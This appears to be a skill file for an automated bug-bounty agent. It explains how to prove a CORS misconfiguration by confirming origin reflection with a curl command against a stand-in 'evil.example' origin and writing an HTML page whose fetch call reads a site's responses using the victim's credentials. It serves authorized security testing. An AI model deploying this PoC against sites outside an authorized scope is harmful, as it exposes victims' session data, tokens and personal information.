---
name: cors-poc-html
description: Turn a reflected-Origin / permissive CORS misconfig into a runnable PoC artifact (credentialed cross-origin read), not just a header observation.
category: proof
tags: [cors, poc, misconfig, credentials, artifact]
chains_with: [attack-cors, poc-standard]
tools: [curl]
version: "1.0"
---

# Building a CORS PoC artifact (misconfig_proven, not info)

A CORS finding dies in triage when it's "the `Access-Control-Allow-Origin` header reflects my Origin".
It lives when you hand over a **runnable PoC** that reads the victim's credentialed response from a
foreign origin. Always build the artifact.

## When to use
Any finding in the CORS / header / redirect / clickjacking family. The exploit-operator sets
`proven_state: misconfig_proven` ONLY after the artifact exists under `raw/`.

## Steps
1. **Confirm the reflection (in scope, through the leash).**
   ```bash
   tools/leashed.sh <target_dir> curl -s -I -H "Origin: https://evil.example" https://<host>/<endpoint>
   ```
   Look for `Access-Control-Allow-Origin: https://evil.example` **and**
   `Access-Control-Allow-Credentials: true`. (Reflected Origin without credentials is weaker — note it.)
2. **Write the PoC artifact** to `<target_dir>/raw/attack-<h>/cors-poc.html` — a small page served
   from a foreign origin that reads the credentialed response:
   ```html
   <!doctype html><html><body><pre id="o">running…</pre><script>
   fetch("https://<host>/<sensitive-endpoint>", { method:"GET", credentials:"include", mode:"cors" })
     .then(r => r.text().then(t => o.textContent = "STATUS "+r.status+"\n\n"+t.slice(0,4000)))
     .catch(e => o.textContent = "BLOCKED (CORS not exploitable): "+e);
   </script></body></html>
   ```
3. **Demonstrate impact.** The endpoint must return something that matters cross-origin (session
   info, PII, tokens, account data). If it returns the victim's data readable from a foreign origin,
   that's the impact — often **HIGH** with credentials (account-takeover-adjacent).
4. **Record.** Save the curl headers + the generated `cors-poc.html` + a one-line repro. Set
   `proven_state: misconfig_proven` (or `impact_proven` if the read yields real victim data),
   `poc_path` = the html.

## Severity
- Credentialed cross-origin read of sensitive data → **high** (per program ceiling).
- Reflected Origin, no credentials / no sensitive data → medium/low, but still a finding with the PoC.
- Never leave a working-PoC CORS as `info` or `not_reproduced`.
